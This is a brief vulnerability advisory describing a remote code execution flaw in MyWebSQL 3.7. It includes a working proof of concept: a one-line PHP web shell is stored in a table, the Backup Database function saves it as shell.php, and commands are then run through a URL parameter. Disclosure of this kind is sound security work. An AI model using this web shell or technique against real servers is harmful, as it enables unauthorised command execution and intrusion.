## MyWebSQL ver 3.7 remote code execution (RCE) vulnerability Description
- Author: YU-HSIANG HUANG, YUNG-HAO TSENG, Eddie TC CHANG
- Contact: huang.yuhsiang.phone@gmail.com; 0xuhaw@gmail.com; eddietcchang@gmail.com
---
### Testing Target
- Product: MyWebSQL
- Version: 3.7
- Official Website: http://mywebsql.net/
- Github: https://github.com/Samnan/MyWebSQL

### Summary
MyWebSQL version in 3.7 has remote code execution (RCE) vulnerability.

### Description
MyWebSQL version in 3.7 has remote code execution (RCE) vulnerability after write a shell code in database and execute `Backup Database` function.
 
### Concept
1. Create a test table (code) and write a shell code in this table.  
 **Shell code example**: `<?php system($_GET[cmd]); ?>`
![](./png/1.png)
2. Execute `Backup Database` function and modify Backup filename as `shell.php`.
![](./png/2.png)
3. Browse `(domain)/mywebsql/backups/shell.php?cmd=XXX`. For instance, `cmd=ipconfig` as below figure.
![](./png/3.png)
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTExNTM4NTkwNDgsLTE5MDA5MDgwMDgsLT
E5MTcyOTM4ODcsMTEwMjQ0NzAxOF19
-->